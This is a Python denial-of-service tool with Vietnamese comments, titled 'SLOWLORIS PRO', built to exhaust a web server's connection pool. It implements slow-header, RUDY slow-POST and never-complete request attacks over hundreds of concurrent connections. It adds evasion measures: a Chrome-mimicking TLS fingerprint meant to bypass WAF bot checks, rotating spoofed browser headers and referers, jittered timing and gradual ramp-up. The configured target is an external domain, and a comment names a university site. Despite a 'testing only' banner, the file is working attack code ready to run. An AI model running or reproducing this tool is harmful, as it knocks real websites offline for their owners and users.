#!/usr/bin/env python3
#  CÁCH CHẠY:
#   1. Cài đặt thư viện cần thiết:
#      pip install aiohttp
#
#   2. Chạy file:
#      python3 tanCong.py
#      
#   3. Hoặc chạy với tham số tùy chỉnh:
#      python3 tanCong.py --url http://target.com --connections 1000 --duration 300
#
#   4. Dừng tấn công:
#      Nhấn Ctrl+C để dừng gracefully
#
#  CẤU HÌNH TẤN CÔNG (Sửa trong hàm main() cuối file):
#   - url: Địa chỉ mục tiêu (VD: "http://127.0.0.1:8000")
#   - pattern: Kiểu tấn công (SLOW_HEADERS / SLOW_POST_BODY / NEVER_COMPLETE)
#   - max_connections: Số kết nối đồng thời (VD: 500)
#   - duration: Thời gian tấn công giây (VD: 300 = 5 phút)
#   - use_ssl: Có dùng HTTPS không (True/False)
#
#3 PATTERN TẤN CÔNG:
#   1. SLOW_HEADERS: Gửi HTTP headers từ từ, không bao giờ gửi \r\n\r\n kết thúc
#      → Server đợi mãi request hoàn chỉnh
#
#   2. SLOW_POST_BODY (RUDY): Gửi POST với Content-Length lớn, body gửi từng byte
#      → Giả vờ upload file 1MB nhưng gửi 1 byte/giây
#
#   3. NEVER_COMPLETE: Request gần hoàn chỉnh nhưng thiếu CRLF cuối
#      → Server tưởng request còn tiếp tục
#
#NGUYÊN LÝ HOẠT ĐỘNG:
#   - Mỗi web server có giới hạn connection pool (thường 100-1000)
#   - Slowloris giữ kết nối mở lâu nhất có thể mà không hoàn thành request
#   - Khi tất cả slots bị chiếm, server không thể nhận thêm request mới
#   - Legitimate users bị từ chối kết nối → DoS thành công
#
# =============================================================================

import asyncio  # Thư viện lập trình bất đồng bộ (async/await)
import aiohttp  # HTTP client bất đồng bộ
import ssl      # Xử lý SSL/TLS cho HTTPS
import random   # Sinh số ngẫu nhiên
import time     # Đo thời gian và sleep
import socket   # Lập trình socket cấp thấp
import signal   # Bắt tín hiệu hệ thống (Ctrl+C)
import sys      # Thao tác với Python runtime
from dataclasses import dataclass, field  # Tạo class cấu hình
from typing import List, Dict, Optional, Callable  # Type hints
from collections import defaultdict  # Dict với giá trị mặc định
from enum import Enum  # Tạo kiểu liệt kê

# =============================================================================
# PHẦN 1: CẤU HÌNH VÀ HẰNG SỐ
# =============================================================================
# Định nghĩa các pattern tấn công và cấu hình mục tiêu

class AttackPattern(Enum):
    """
    Enum định nghĩa 3 kiểu tấn công Slowloris chuẩn.
    Mỗi kiểu khai thác một điểm yếu khác nhau của HTTP server.
    """
    SLOW_HEADERS = "slow_headers"      
    # Gửi HTTP headers từng dòng một, cách nhau 10-30 giây
    # Không bao giờ gửi \r\n\r\n kết thúc request
    
    SLOW_POST_BODY = "slow_post_body"  
    # R-U-Dead-Yet (RUDY): Gửi POST với Content-Length lớn
    # Nhưng body được gửi từng byte chậm rãi
    
    NEVER_COMPLETE = "never_complete"  
    # Gửi request gần như hoàn chỉnh nhưng thiếu CRLF cuối cùng
    # Server đợi mãi vì tưởng request còn tiếp tục


@dataclass
class TargetConfig:
    """
    Class cấu hình cho từng mục tiêu tấn công.
    
    Attributes:
        url: Địa chỉ URL mục tiêu (VD: "http://127.0.0.1:8000")
        pattern: Kiểu tấn công (mặc định: SLOW_POST_BODY)
        max_connections: Số kết nối tối đa đồng thời
        duration: Thời gian tấn công tính bằng giây
        min_interval: Thời gian chờ tối thiểu giữa các chunk (giây)
        max_interval: Thời gian chờ tối đa giữa các chunk (giây)
        use_ssl: Có sử dụng HTTPS không
        http_version: Phiên bản HTTP ("1.1" hoặc "2")
    
    Ví dụ sử dụng:
        config = TargetConfig(
            url="http://target.com",
            pattern=AttackPattern.SLOW_HEADERS,
            max_connections=500,
            duration=300
        )
    """
    url: str
    pattern: AttackPattern = AttackPattern.SLOW_POST_BODY
    max_connections: int = 1000
    duration: int = 300                    # Giây
    min_interval: float = 8.0              # Giây
    max_interval: float = 25.0              # Giây
    use_ssl: bool = True
    http_version: str = "1.1"


# =============================================================================
# PHẦN 2: DỮ LIỆU MÔ PHỎNG TRÌNH DUYỆT (BROWSER FINGERPRINTING)
# =============================================================================
# Các User-Agent, headers, payloads giống hệt người dùng thật
# Giúp tránh bị phát hiện bởi WAF/IDS

# Danh sách User-Agent từ các trình duyệt phổ biến nhất hiện nay
# Mỗi connection sẽ chọn ngẫu nhiên một UA để không bị detect pattern
USER_AGENTS = [
    # Chrome 124 trên Windows 11 - Trình duyệt phổ biến nhất
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    # Chrome 124 trên macOS
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    # Safari 17.4 trên macOS
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
    # Firefox 125 trên Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    # Chrome trên Android (Samsung Galaxy S10)
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    # Safari trên iOS (iPhone)
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
]

# Các giá trị Accept header phổ biến
ACCEPT_HEADERS = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
]

# Referer giả mạo - giống như user đến từ các trang web phổ biến
REFERERS = [
    "https://www.google.com/search?q=login",
    "https://www.facebook.com/",
    "https://www.youtube.com/",
    "https://www.linkedin.com/",
    "https://www.reddit.com/",
    "https://www.bing.com/search?q=home",
]


# =============================================================================
# PHẦN 3: PAYLOAD THỰC TẾ
# =============================================================================
# Thay vì gửi dữ liệu vô nghĩa, dùng payloads giống request thật
# Giúp mô phỏng tấn công vào các chức năng cụ thể của web app

REALISTIC_PAYLOADS = [
    # Form đăng nhập
    b"username=admin&password=123456&remember_me=on&submit=Login",
    # Tìm kiếm sản phẩm
    b"q=laptop+gaming+2024&category=electronics&sort=price_asc&page=1",
    # Đăng ký nhận tin
    b"email=user%40example.com&subscribe=1&source=homepage",
    # Form liên hệ
    b"name=John+Doe&email=john%40example.com&message=Hello+world&submit=Send",
    # API JSON (với Content-Type: application/json)
    b'{"action": "search", "query": "products", "filters": {"price": {"min": 0, "max": 1000}, "category": "electronics"}}',
    # Thêm vào giỏ hàng
    b"product_id=12345&quantity=1&variant=blue&add_to_cart=1",
]

# Headers giả để gửi thêm trong Slow Headers attack
# Các headers này không có ý nghĩa đặc biệt nhưng giúp giữ kết nối mở
SLOWLORIS_HEADERS = [
    b"X-a: b\r\n",
    b"X-b: c\r\n",
    b"X-c: d\r\n",
    b"X-d: e\r\n",
    b"X-e: f\r\n",
    b"Accept-CH: UA, UA-Platform, UA-Arch\r\n",
    b"Accept-CH-Lifetime: 86400\r\n",
]


# =============================================================================
# PHẦN 4: METRICS VÀ DASHBOARD
# =============================================================================
# Theo dõi số liệu thống kê tấn công real-time

@dataclass
class AttackMetrics:
    """
    Class theo dõi các metrics của cuộc tấn công.
    
    Các chỉ số quan trọng:
    - active_connections: Số kết nối đang mở hiện tại
    - total_connections: Tổng số kết nối đã tạo
    - successful_hangs: Số kết nối giữ được đến hết thời gian
    - closed_by_server: Số kết nối bị server chủ động đóng
    - rate_limited: Số request bị trả về HTTP 429 (Too Many Requests)
    - errors: Số lỗi khác xảy ra
    - bytes_sent: Tổng bytes đã gửi đi
    """
    active_connections: int = 0
    total_connections: int = 0
    successful_hangs: int = 0
    closed_by_server: int = 0
    rate_limited: int = 0
    errors: int = 0
    avg_connection_lifetime: float = 0.0
    bytes_sent: int = 0
    start_time: float = field(default_factory=time.time)
    
    def display(self):
        """
        In ra dashboard hiển thị các metrics.
        Được gọi tự động mỗi 10 giây.
        """
        elapsed = time.time() - self.start_time
        print(f"\n{'='*70}")
        print(f"[SLOWLORIS PRO] REAL-TIME ATTACK DASHBOARD")
        print(f"{'='*70}")
        print(f"⏱️  Elapsed Time:        {elapsed:.1f}s")
        print(f"🟢 Active Connections:    {self.active_connections}")
        print(f"📊 Total Connections:     {self.total_connections}")
        print(f"✅ Successful Hangs:      {self.successful_hangs}")
        print(f"❌ Closed by Server:      {self.closed_by_server}")
        print(f"⚠️  Rate Limited (429):    {self.rate_limited}")
        print(f"💀 Errors:                {self.errors}")
        print(f"📦 Total Bytes Sent:      {self.bytes_sent:,}")
        if self.total_connections > 0:
            success_rate = (self.successful_hangs / self.total_connections) * 100
            print(f"📈 Success Rate:          {success_rate:.1f}%")
        print(f"{'='*70}\n")


# Global instance - được dùng xuyên suốt chương trình
METRICS = AttackMetrics()

# Event để báo hiệu cần dừng chương trình (khi nhấn Ctrl+C)
SHUTDOWN_EVENT = asyncio.Event()


# =============================================================================
# PHẦN 5: SSL/TLS FINGERPRINT EVASION
# =============================================================================
# Tạo SSL context giống fingerprint của Chrome để tránh bị phát hiện

def create_stealth_ssl_context() -> ssl.SSLContext:
    """
    Tạo SSL context với fingerprint giống Chrome 124.
    
    CloudFlare và các WAF hiện đại kiểm tra JA3 fingerprint để phát hiện bot.
    Hàm này cấu hình cipher suites giống Chrome để bypass kiểm tra.
    
    Returns:
        SSLContext đã cấu hình để giả mạo Chrome
    """
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    
    # TLS 1.2 là minimum, hỗ trợ tối đa TLS 1.3
    context.minimum_version = ssl.TLSVersion.TLSv1_2
    context.maximum_version = ssl.TLSVersion.MAXIMUM_SUPPORTED
    
    # 15 cipher suites từ Chrome 124 - thứ tự quan trọng!
    ciphers = [
        "TLS_AES_128_GCM_SHA256",
        "TLS_AES_256_GCM_SHA384",
        "TLS_CHACHA20_POLY1305_SHA256",
        "ECDHE-ECDSA-AES128-GCM-SHA256",
        "ECDHE-RSA-AES128-GCM-SHA256",
        "ECDHE-ECDSA-AES256-GCM-SHA384",
        "ECDHE-RSA-AES256-GCM-SHA384",
        "ECDHE-ECDSA-CHACHA20-POLY1305",
        "ECDHE-RSA-CHACHA20-POLY1305",
        "ECDHE-RSA-AES128-SHA",
        "ECDHE-RSA-AES256-SHA",
        "AES128-GCM-SHA256",
        "AES256-GCM-SHA384",
        "AES128-SHA",
        "AES256-SHA"
    ]
    context.set_ciphers(":".join(ciphers))
    
    # Tắt verification cho lab testing (KHÔNG dùng ngoài thực tế!)
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    
    return context


# =============================================================================
# PHẦN 6: TẠO HTTP HEADERS GIỐNG BROWSER
# =============================================================================

def build_browser_headers() -> Dict[str, str]:
    """
    Tạo bộ HTTP headers giống hệt trình duyệt thật.
    
    Chọn ngẫu nhiên User-Agent và tạo headers phù hợp.
    Chrome và Safari có headers khác nhau nên cần xử lý riêng.
    
    Returns:
        Dict chứa các HTTP headers
    """
    ua = random.choice(USER_AGENTS)
    is_chrome = "Chrome" in ua
    is_safari = "Safari" in ua and "Chrome" not in ua
    
    # Headers cơ bản áp dụng cho mọi browser
    headers = {
        "User-Agent": ua,
        "Accept": random.choice(ACCEPT_HEADERS),
        "Accept-Language": random.choice([
            "en-US,en;q=0.9,vi;q=0.8",
            "en-US,en;q=0.9",
            "en-GB,en;q=0.9,en-US;q=0.8",
        ]),
        "Accept-Encoding": "gzip, deflate, br",
        "DNT": "1",  # Do Not Track
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Cache-Control": random.choice(["max-age=0", "no-cache", "no-store"]),
        "Referer": random.choice(REFERERS),
    }
    
    # Chrome có thêm headers đặc biệt (sec-ch-ua family)
    if is_chrome:
        headers["sec-ch-ua"] = '"Chromium";v="124", "Google Chrome";v="124"'
        headers["sec-ch-ua-mobile"] = "?0"
        headers["sec-ch-ua-platform"] = '"Windows"' if "Windows" in ua else '"macOS"'
    
    # Safari KHÔNG có sec-ch-ua headers
    if is_safari:
        headers.pop("sec-ch-ua", None)
        headers.pop("sec-ch-ua-mobile", None)
    
    return headers


# =============================================================================
# PHẦN 7: LỚP TẤN CÔNG CHÍNH
# =============================================================================

class SlowlorisAttacker:
    """
    Lớp chính thực hiện tấn công Slowloris.
    
    Chức năng chính:
    - Quản lý cấu hình tấn công (pattern, thời gian, số connections)
    - Triển khai 3 kiểu tấn công Slowloris khác nhau
    - Tính toán thời gian chờ ngẫu nhiên để tránh bị phát hiện
    - Quản lý SSL context cho kết nối HTTPS
    
    Usage:
        config = TargetConfig(
            url="http://target.com",
            pattern=AttackPattern.SLOW_POST_BODY
        )
        attacker = SlowlorisAttacker(config)
        await attacker.run_attack(1)  # Chạy connection số 1
    """
    
    def __init__(self, config: TargetConfig):
        """
        Khởi tạo attacker với cấu hình.
        
        Args:
            config: TargetConfig chứa thông tin mục tiêu
        """
        self.config = config
        self.ssl_context = create_stealth_ssl_context() if config.use_ssl else None
        self.session_cookie: Optional[str] = None
    
    async def _get_jitter_interval(self) -> float:
        """
        Tính thời gian chờ ngẫu nhiên.
        
        Trả về giá trị trong khoảng [min_interval, max_interval]
        với 20% khả năng trả về nửa thời gian (jitter).
        
        Returns:
            Thời gian chờ tính bằng giây
        """
        base = random.uniform(self.config.min_interval, self.config.max_interval)
        # 20% cơ hội gửi nhanh hơn (mô phỏng người dùng thật)
        if random.random() < 0.2:
            return base * 0.5
        return base
    
    async def attack_slow_headers(self, idx: int):
        """
        PATTERN 1: SLOW HEADERS ATTACK
        
        NGUYÊN LÝ:
        HTTP request kết thúc bằng \r\n\r\n (2 dòng trống liên tiếp).
        Nếu không gửi kết thúc, server sẽ đợi thêm data mãi mãi.
        
        CÁCH THỰC HIỆN:
        1. Mở TCP socket đến server
        2. Gửi "GET / HTTP/1.1\r\nHost: target\r\n"
        3. Mỗi 10-30 giây gửi thêm 1 header line
        4. Không bao giờ gửi \r\n\r\n kết thúc
        5. Giữ kết nối mở cho đến khi hết thời gian
        
        Args:
            idx: Số thứ tự connection (để debug)
        """
        conn_id = f"SH-{idx}"  # SH = Slow Headers
        start_time = time.time()
        METRICS.total_connections += 1
        METRICS.active_connections += 1
        
        try:
            # Mở kết nối TCP
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(
                    self.config.url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0],
                    int(self.config.url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[1]) if ":" in self.config.url else (443 if self.config.use_ssl else 80)
                ),
                timeout=30
            )
            
            # Gửi request line và host header
            host = self.config.url.replace("http://", "").replace("https://", "").split("/")[0]
            request_line = f"GET / HTTP/1.1\r\nHost: {host}\r\n".encode()
            writer.write(request_line)
            METRICS.bytes_sent += len(request_line)
            await writer.drain()
            print(f"[{conn_id}] 🚀 Đã gửi request line + Host header")
            
            # Vòng lặp gửi headers từ từ
            header_count = 0
            while (time.time() - start_time) < self.config.duration and not SHUTDOWN_EVENT.is_set():
                header = random.choice(SLOWLORIS_HEADERS)
                writer.write(header)
                METRICS.bytes_sent += len(header)
                await writer.drain()
                header_count += 1
                
                # In log mỗi 5 headers
                if header_count % 5 == 0:
                    print(f"[{conn_id}] 📨 Đã gửi {header_count} headers, sống được {time.time() - start_time:.1f}s")
                
                # Chờ ngẫu nhiên trước khi gửi tiếp
                await asyncio.sleep(await self._get_jitter_interval())
            
            METRICS.successful_hangs += 1
            
        except asyncio.TimeoutError:
            # Timeout = server quá tải, không thể accept connection mới
            print(f"[{conn_id}] ⏱️ Connection timeout (server có thể đã quá tải!)")
            METRICS.successful_hangs += 1
        except ConnectionResetError:
            print(f"[{conn_id}] 💀 Connection bị server reset")
            METRICS.closed_by_server += 1
        except Exception as e:
            print(f"[{conn_id}] ❌ Lỗi: {type(e).__name__}: {str(e)[:50]}")
            METRICS.errors += 1
        finally:
            # Giải phóng connection slot
            METRICS.active_connections -= 1
            try:
                writer.close()
                await writer.wait_closed()
            except:
                pass
    
    async def attack_slow_post_body(self, idx: int):
        """
        PATTERN 2: R-U-DEAD-YET (RUDY) ATTACK
        
        NGUYÊN LÝ:
        Server đọc Content-Length để biết cần nhận bao nhiêu byte body.
        Nếu báo Content-Length=1000000 nhưng chỉ gửi 1 byte/giây,
        server sẽ giữ connection mở CHỜ ĐỦ 1MB data.
        
        Tính toán: 1 byte/giây × 1,000,000 byte = 11.5 ngày!
        Trong thực tế attack chỉ chạy vài phút nhưng vẫn rất hiệu quả.
        
        CÁCH THỰC HIỆN:
        1. Mở TCP socket
        2. Gửi POST headers với Content-Length: 1000000
        3. Gửi body từng 1-5 bytes, chờ 8-25s giữa các lần
        4. Lặp cho đến khi hết duration
        
        Args:
            idx: Số thứ tự connection
        """
        conn_id = f"RUDY-{idx}"  # RUDY = R-U-Dead-Yet
        start_time = time.time()
        METRICS.total_connections += 1
        METRICS.active_connections += 1
        
        try:
            # Tạo headers giống browser
            headers = build_browser_headers()
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            headers["Content-Length"] = "1000000"  # Giả vờ gửi 1MB
            
            # Build request string
            host = self.config.url.replace("http://", "").replace("https://", "").split("/")[0]
            header_str = f"POST /api/upload HTTP/1.1\r\nHost: {host}\r\n"
            for k, v in headers.items():
                header_str += f"{k}: {v}\r\n"
            header_str += "\r\n"  # Kết thúc headers
            
            # Mở kết nối
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(
                    host.split(":")[0],
                    int(host.split(":")[1]) if ":" in host else (443 if self.config.use_ssl else 80)
                ),
                timeout=30
            )
            
            # Gửi headers trước
            writer.write(header_str.encode())
            METRICS.bytes_sent += len(header_str)
            await writer.drain()
            print(f"[{conn_id}] 🚀 Đã gửi POST headers, Content-Length: 1000000")
            
            # Gửi body từng byte chậm rãi
            payload = random.choice(REALISTIC_PAYLOADS)
            bytes_sent = 0
            byte_idx = 0
            
            while (time.time() - start_time) < self.config.duration and bytes_sent < 1000000 and not SHUTDOWN_EVENT.is_set():
                # Nếu hết payload thì lặp lại từ đầu
                if byte_idx >= len(payload):
                    byte_idx = 0
                
                # Gửi 1-5 bytes mỗi lần
                chunk = payload[byte_idx:byte_idx+random.randint(1, 5)]
                writer.write(chunk)
                METRICS.bytes_sent += len(chunk)
                bytes_sent += len(chunk)
                byte_idx += len(chunk)
                await writer.drain()
                
                # Log mỗi 100 bytes
                if bytes_sent % 100 == 0:
                    print(f"[{conn_id}]Đã gửi {bytes_sent} bytes, thời gian: {time.time() - start_time:.1f}s")
                
                # Chờ ngẫu nhiên
                await asyncio.sleep(await self._get_jitter_interval())
            
            METRICS.successful_hangs += 1
            
        except ConnectionResetError:
            print(f"[{conn_id}] Connection bị reset")
            METRICS.closed_by_server += 1
        except Exception as e:
            print(f"[{conn_id}]Lỗi: {type(e).__name__}: {str(e)[:50]}")
            METRICS.errors += 1
        finally:
            METRICS.active_connections -= 1
            try:
                writer.close()
                await writer.wait_closed()
            except:
                pass
    
    async def attack_never_complete(self, idx: int):
        """
        PATTERN 3: NEVER-COMPLETE REQUEST ATTACK
        
        NGUYÊN LÝ:
        HTTP/1.1 cho phép gửi nhiều header liên tiếp.
        Request chỉ được xử lý khi nhận đủ \r\n\r\n.
        Nếu không gửi kết thúc, server tưởng request còn tiếp tục.
        
        CÁCH THỰC HIỆN:
        1. Mở TCP socket
        2. Gửi request HOÀN CHỈNH trừ \r\n cuối cùng
        3. Thỉnh thoảng gửi thêm header X-Random để giữ kết nối
        4. Server luôn trong trạng thái "đang đọc request"
        
        Args:
            idx: Số thứ tự connection
        """
        conn_id = f"NC-{idx}"  # NC = Never Complete
        start_time = time.time()
        METRICS.total_connections += 1
        METRICS.active_connections += 1
        
        try:
            headers = build_browser_headers()
            host = self.config.url.replace("http://", "").replace("https://", "").split("/")[0]
            
            # Build request THIẾU \r\n cuối cùng
            request = f"GET /search?q={random.randint(100000, 999999)} HTTP/1.1\r\n"
            request += f"Host: {host}\r\n"
            for k, v in headers.items():
                request += f"{k}: {v}\r\n"
            # KHÔNG có \r\n cuối cùng!
            
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(
                    host.split(":")[0],
                    int(host.split(":")[1]) if ":" in host else (443 if self.config.use_ssl else 80)
                ),
                timeout=30
            )
            
            writer.write(request.encode())
            METRICS.bytes_sent += len(request)
            await writer.drain()
            print(f"[{conn_id}] 🚀 Đã gửi incomplete request (thiếu CRLF cuối)")
            
            # Giữ kết nối mở
            iteration = 0
            while (time.time() - start_time) < self.config.duration and not SHUTDOWN_EVENT.is_set():
                await asyncio.sleep(await self._get_jitter_interval())
                
                # 30% cơ hội gửi thêm header
                if random.random() < 0.3:
                    extra = f"X-Random-{random.randint(1, 100)}: value\r\n"
                    writer.write(extra.encode())
                    METRICS.bytes_sent += len(extra)
                    await writer.drain()
                
                iteration += 1
                if iteration % 10 == 0:
                    print(f"[{conn_id}] ⏳ Giữ kết nối sống... {time.time() - start_time:.1f}s")
            
            METRICS.successful_hangs += 1
            
        except ConnectionResetError:
            print(f"[{conn_id}]Connection bị reset")
            METRICS.closed_by_server += 1
        except Exception as e:
            print(f"[{conn_id}]Lỗi: {type(e).__name__}: {str(e)[:50]}")
            METRICS.errors += 1
        finally:
            METRICS.active_connections -= 1
            try:
                writer.close()
                await writer.wait_closed()
            except:
                pass
    
    async def run_attack(self, idx: int):
        """
        Dispatcher - Chọn và chạy pattern phù hợp.
        
        Dựa vào self.config.pattern để quyết định chạy hàm nào:
        - SLOW_HEADERS → attack_slow_headers()
        - SLOW_POST_BODY → attack_slow_post_body()
        - NEVER_COMPLETE → attack_never_complete()
        
        Args:
            idx: Số thứ tự connection
        """
        if self.config.pattern == AttackPattern.SLOW_HEADERS:
            await self.attack_slow_headers(idx)
        elif self.config.pattern == AttackPattern.SLOW_POST_BODY:
            await self.attack_slow_post_body(idx)
        elif self.config.pattern == AttackPattern.NEVER_COMPLETE:
            await self.attack_never_complete(idx)


# =============================================================================
# PHẦN 8: ĐIỀU PHỐI CHÍNH
# =============================================================================

async def run_target_attacks(config: TargetConfig, target_id: int):
    """
    Chạy tấn công cho một mục tiêu.
    
    Tạo nhiều connections theo thời gian (không tạo 500 ngay lập tức)
    để tránh bị hệ thống phát hiện và block ngay.
    
    Args:
        config: Cấu hình target
        target_id: ID để phân biệt các target
    """
    print(f"\n{'='*70}")
    print(f"🎯 TARGET {target_id}: {config.url}")
    print(f"   Pattern: {config.pattern.value}")
    print(f"   Connections: {config.max_connections}")
    print(f"   Duration: {config.duration}s")
    print(f"{'='*70}\n")
    
    attacker = SlowlorisAttacker(config)
    tasks = []
    
    # Tạo connections dần dần (tránh detection)
    for i in range(config.max_connections):
        if SHUTDOWN_EVENT.is_set():
            break
        
        # Tạo task mới cho mỗi connection
        task = asyncio.create_task(attacker.run_attack(i + 1))
        tasks.append(task)
        
        # Chờ 0.1 giây sau mỗi 10 connections (tức là 100 connections/giây)
        if i % 10 == 0:
            await asyncio.sleep(0.1)
    
    # Đợi tất cả connections hoàn thành hoặc bị dừng
    await asyncio.gather(*tasks, return_exceptions=True)


async def metrics_reporter():
    """
    Task báo cáo metrics định kỳ.
    
    Chạy song song với tấn công, mỗi 10 giây in dashboard một lần.
    Dừng khi SHUTDOWN_EVENT được set.
    """
    while not SHUTDOWN_EVENT.is_set():
        await asyncio.sleep(10)  # Đợi 10 giây
        if not SHUTDOWN_EVENT.is_set():
            METRICS.display()


def signal_handler():
    """
    Xử lý tín hiệu dừng (Ctrl+C).
    
    Khi user nhấn Ctrl+C:
    1. In thông báo đang dừng
    2. Set SHUTDOWN_EVENT để báo các task dừng
    3. Các connections sẽ đóng gracefully
    """
    print("\n\n⚠️  Nhận tín hiệu dừng. Đang dừng tấn công...")
    SHUTDOWN_EVENT.set()


async def main():
    """
    Hàm chính - Điểm vào chương trình.
    
    QUY TRÌNH:
    1. In banner cảnh báo
    2. Cài đặt bắt tín hiệu Ctrl+C
    3. Định nghĩa danh sách targets cần tấn công
    4. Khởi động metrics reporter
    5. Chạy tất cả attack tasks
    6. In báo cáo cuối cùng
    
    ⚠️ SỬA CẤU HÌNH TẠI ĐÂY:
    Trong phần 'targets = [...]' bên dưới, sửa các tham số:
    - url: Địa chỉ mục tiêu
    - pattern: Kiểu tấn công muốn dùng
    - max_connections: Số lượng kết nối
    - duration: Thời gian chạy (giây)
    - use_ssl: True nếu dùng HTTPS
    """
    print("""
    ╔════════════════════════════════════════════════════════════════╗
    ║           SLOWLORIS PRO - Advanced DoS Simulator               ║
    ║           ⚠️  CHỈ DÙNG CHO MỤC ĐÍCH KIỂM TRA ⚠️                ║
    ╚════════════════════════════════════════════════════════════════╝
    """)
    
    # Cài đặt bắt Ctrl+C và SIGTERM
    for sig in (signal.SIGINT, signal.SIGTERM):
        asyncio.get_event_loop().add_signal_handler(sig, signal_handler)
    
    # ================================================================
    # ⚠️  CẤU HÌNH TẤN CÔNG - SỬA Ở ĐÂY
    # ================================================================
    targets = [
        TargetConfig(
            #url="http://127.0.0.1:8000",           # ← Sửa URL mục tiêu
            url="https://myBlogforTestDDos.com.vn",
            pattern=AttackPattern.SLOW_POST_BODY,   # ← Chọn pattern: SLOW_HEADERS / SLOW_POST_BODY / NEVER_COMPLETE
            max_connections=500,                     # ← Số kết nối đồng thời
            duration=300,                            # ← Thời gian chạy (giây)
            use_ssl=True,                           # ← True nếu dùng HTTPS https://sinhvien.uneti.edu.vn/bang-tin.html
        ),
        # Có thể thêm nhiều target để tấn công đồng thời:
        # TargetConfig(
        #     url="https://target.com",
        #     pattern=AttackPattern.SLOW_HEADERS,
        #     max_connections=1000,
        #     duration=600,
        #     use_ssl=True,
        # ),
    ]
    # ================================================================
    
    # Khởi động task báo cáo metrics
    metrics_task = asyncio.create_task(metrics_reporter())
    
    # Tạo các task tấn công cho từng target
    attack_tasks = [
        asyncio.create_task(run_target_attacks(target, i + 1))
        for i, target in enumerate(targets)
    ]
    
    # Đợi tất cả hoàn thành
    await asyncio.gather(*attack_tasks, return_exceptions=True)
    
    # Dừng metrics reporter và in báo cáo cuối
    SHUTDOWN_EVENT.set()
    await asyncio.sleep(0.5)
    METRICS.display()
    
    print("\nTấn công hoàn tất")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n\ndừng chương trình")
        METRICS.display()
